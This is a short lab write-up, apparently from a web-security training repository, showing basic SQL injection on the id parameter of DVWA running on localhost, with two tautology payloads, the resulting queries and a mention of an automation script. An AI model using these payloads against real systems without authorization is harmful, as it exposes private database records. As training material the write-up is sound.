# 🛡️ Basic SQL Injection on ID Field (GET Request)

## 1. Objective

Perform a **basic SQL Injection** by manipulating a GET parameter (`id`) to retrieve information from the database without proper authorization.

---

## 2. Target

Target URL example:

```plaintext
http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
```

---

## 3. Manual Injection Example

Try injecting payloads such as:

```plaintext
1' OR '1'='1
```

or:

```plaintext
2' OR 1=1#
```

Result:

- The SQL query becomes **always true** (`WHERE id = '1' OR '1'='1'`), so the application displays **all users** or **unintended information**.

---

### 🖼️ Example Screenshot

Example result after successful basic SQL Injection:

```markdown
![SQL Injection Result Example](../images/sqli_basic_id_injection_result.png)
```

---

## 4. Internal Behavior (SQL Query)

Normal query:

```sql
SELECT first_name, last_name FROM users WHERE id = '1';
```

Injected query:

```sql
SELECT first_name, last_name FROM users WHERE id = '1' OR '1'='1';
```

Explanation:

- The condition is **always true**.
- The application **leaks more information** than intended.

---

## 5. Python Script to Automate the Test

We created a Python script that:

- Sends multiple payloads into the `id` parameter.
- Detects different responses based on the page content (e.g., keyword detection).

Script location:

```plaintext
audit-web/sql_injection/scripts/test_basic_sqli_id.py
```

The script uses:

- `requests`
- `BeautifulSoup` (optional)

Purpose:

- Quickly test several SQL payloads.
- Identify vulnerable behaviors automatically.





